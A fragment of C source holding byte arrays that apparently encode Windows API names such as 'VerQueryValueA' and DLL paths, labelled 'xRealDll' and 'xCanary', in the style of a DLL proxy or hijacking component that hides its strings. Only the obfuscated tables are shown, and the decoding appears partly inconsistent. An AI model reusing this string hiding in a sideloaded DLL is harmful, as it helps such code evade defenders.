...
static const unsigned char xCanary[] = {
    0xE4, 0x9D, 0xD7, 0xF0, 0xCC, 0xC9, 0xC3, 0xC8,
    0xF0, 0xD6, 0xD7, 0xF3, 0xC2, 0xCA, 0xD1, 0xD7,
    0xD1, 0xC2, 0xD5, 0x88, 0xC4, 0xC6, 0xC4, 0xCB,
    0xC2, 0x87, 0xC9, 0xC8, 0xC0
};
...
static const unsigned char xRealDll[] = {
    0xE4, 0x9D, 0xD7, 0xF0, 0xCC, 0xC9, 0xC3, 0xC8,
    0xF0, 0xD6, 0xD7, 0xF4, 0xD0, 0xD6, 0xD7, 0xC2,
    0xCA, 0x86, 0x85, 0xD7, 0xD1, 0xC2, 0xD5, 0xD6,
    0xCC, 0xC8, 0xC9, 0x87, 0xC3, 0xC9, 0xC9
};
...
static const unsigned char xE1[] = {
    0xE0, 0xC2, 0xD7, 0xE1, 0xCC, 0xC9, 0xC2, 0xF1,
    0xC2, 0xD5, 0xD6, 0xCC, 0xC8, 0xC9, 0xEC, 0xC9,
    0xC3, 0xC8, 0xE6
};
#define xE1_LEN 19
...
static const unsigned char xE3[] = {
    0xE0, 0xC2, 0xD7, 0xE1, 0xCC, 0xC9, 0xC2, 0xF1,
    0xC2, 0xD5, 0xD6, 0xCC, 0xC8, 0xC9, 0xEC, 0xC9,
    0xC3, 0xC8, 0xF4, 0xCC, 0xD3, 0xC2, 0xE6
};
#define xE3_LEN 23
...
static const unsigned char xE4[] = {
    0xE0, 0xC2, 0xD7, 0xE1, 0xCC, 0xC9, 0xC2, 0xF1,
    0xC2, 0xD5, 0xD6, 0xCC, 0xC8, 0xC9, 0xEC, 0xC9,
    0xC3, 0xC8, 0xF4, 0xCC, 0xD3, 0xC2, 0xF0
};
#define xE4_LEN 23

/* "VerQueryValueA" */
static const unsigned char xE5[] = {
    0xF1, 0xC2, 0xD5, 0xF4, 0xD6, 0xC2, 0xD5, 0xD0,
    0xF1, 0xC6, 0xC9, 0xD6, 0xC2, 0xE6
};
#define xE5_LEN 14
